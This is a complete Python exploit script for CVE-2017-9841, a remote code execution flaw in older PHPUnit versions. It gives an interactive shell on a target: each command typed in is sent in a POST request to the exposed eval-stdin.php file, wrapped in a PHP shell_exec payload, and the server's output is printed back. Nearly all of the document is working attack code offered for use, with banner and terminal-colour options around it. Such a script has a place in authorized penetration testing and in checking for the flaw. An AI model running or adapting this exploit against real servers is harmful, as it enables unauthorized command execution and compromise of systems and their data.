#!/usr/bin/env python3
# exploit title: phpunit-shell
# author: p1ckzi
#         github: https://github.com/p1ckzi
#         twitter: @p1ckzi
# vendor home: https://phpunit.de/
# vulnerable software and version: before 4.8.28 and 5.x before 5.6.3.
# tested on: Ubuntu Linux 20.04.
# cve: 2017-9841
#
# description:
# simple script that exploits a remote code execution vulnerability found in
# PHPUnit before 4.8.28 and 5.x before 5.6.3. makes a post request to the
# target with user input system commands.
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9841.

import argparse
import errno
import re
import readline
import requests
import sys
from bs4 import BeautifulSoup


def arguments():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f"{sys.argv[0]} exploits an RCE vulnerability in"
        "\napplications running PHPUnit before 4.8.28 and 5.x before 5.6.3.",
        epilog=f"example:"
        f"\n\t{sys.argv[0]} 10.10.10.10/vendor/phpunit/phpunit/src/Util/PHP"
        "/eval-stdin.php"
    )
    parser.add_argument("address", help="ip/hostname, port, sub-directories"
                        " to the vulnerable eval-stdin.php file.")
    parser.add_argument("-a", "--accessible", help="turns off features"
                        " which may negatively affect screen readers",
                        action="store_true", default=False)
    parser.add_argument("-n", "--no-colour", help="removes colour output",
                        action="store_true", default=False)
    arguments.option = parser.parse_args()


# settings for terminal output defined by user in term_settings().
class settings():
    # colours.
    c0 = ""
    c1 = ""
    c2 = ""
    c3 = ""
    c4 = ""
    c5 = ""
    c6 = ""
    c7 = ""

    # information boxes.
    i1 = ""
    i2 = ""
    i3 = ""
    i4 = ""


# checks for terminal setting flags supplied by arguments().
def term_settings():
    if arguments.option.accessible:
        small_banner()
    elif arguments.option.no_colour:
        settings.i1 = "[+] "
        settings.i2 = "[!] "
        settings.i3 = "[i] "
        settings.i4 = "$ "
        banner()
    elif not arguments.option.accessible or arguments.option.no_colour:
        settings.c0 = "\u001b[0m"  # reset.
        settings.c1 = "\u001b[38;5;111m"  # marine blue.
        settings.c2 = "\u001b[38;5;1m"   # red.
        settings.c3 = "\u001b[38;5;2m"   # green.
        settings.i1 = "[+] "
        settings.i2 = "[!] "
        settings.i3 = "[i] "
        settings.i4 = "$ "
        banner()
    else:
        print("something went horribly wrong!")
        sys.exit()


# default terminal banner.
def banner():
    print(
        f"{settings.c3}\n       _                       _  _   "
        f"{settings.c3}\n _ __ | |_   _ __  _  _  _ _  (_)| |_ "
        f"{settings.c3}\n| '_ \\| ' \\ | '_ \\| || || ' \\ | ||  _|"
        f"{settings.c3}\n| .__/|_||_|| .__/ \\_,_||_||_||_| \\__|"
        f"{settings.c3}\n|_|{settings.c1}_| |_   _{settings.c3}|_|"
        f"{settings.c1}| || |                 "
        f"{settings.c1}\n(_-<| ' \\ / -_)| || |                 "
        f"{settings.c1}\n/__/|_||_|\\___||_||_|{settings.c0}"
        "\nCVE-2017-9841."
    )


def small_banner():
    print(
        f"{sys.argv[0]}"
        "\nCVE-2017-9841."
    )


def arg_check(address):
    check = re.search('eval-stdin.php$', address)
    if check is not None:
        print('')
    else:
        print(
            f"{settings.c2}{settings.i2}the supplied address does not appear "
            "to be towards an '/Util/PHP/eval-stdin.php\' file."
            )
        sys.exit()


def shell(address):
    try:
        connect = requests.get(address)
        if connect.status_code != 404:
            print(
                f"{settings.c3}{settings.i1}connected ok."
                f"{settings.c0}"
                )
        else:
            print(
                f"{settings.c2}{settings.i2}could not connect."
                f"to {address}{settings.c0}"
                )
            sys.exit()

        print(f"{settings.i3}type the commands you want to run.{settings.c0}")
        while True:
            cmd = input(f"{settings.i4}")
            upload = requests.post(
                address,
                data=f"<?php echo(shell_exec('{cmd}'));?>",
                verify=False,
                timeout=30
            )
            response = BeautifulSoup(upload.content, "html.parser")
            print(response)
    except KeyboardInterrupt:
        print(f"\n{settings.i3}quitting.")
        sys.exit()
    except requests.exceptions.Timeout:
        print(
            f"{settings.c2}{settings.i2}the request timed out "
            f"while attempting to connect.{settings.c0}"
        )
        sys.exit()
    except requests.ConnectionError:
        print(
            f"{settings.c2}{settings.i2}could not connect."
            f"to {address}{settings.c0}"
            )
        sys.exit()


def main():
    arguments()
    term_settings()
    arg_check(arguments.option.address)
    shell(arguments.option.address)


if __name__ == "__main__":
    main()
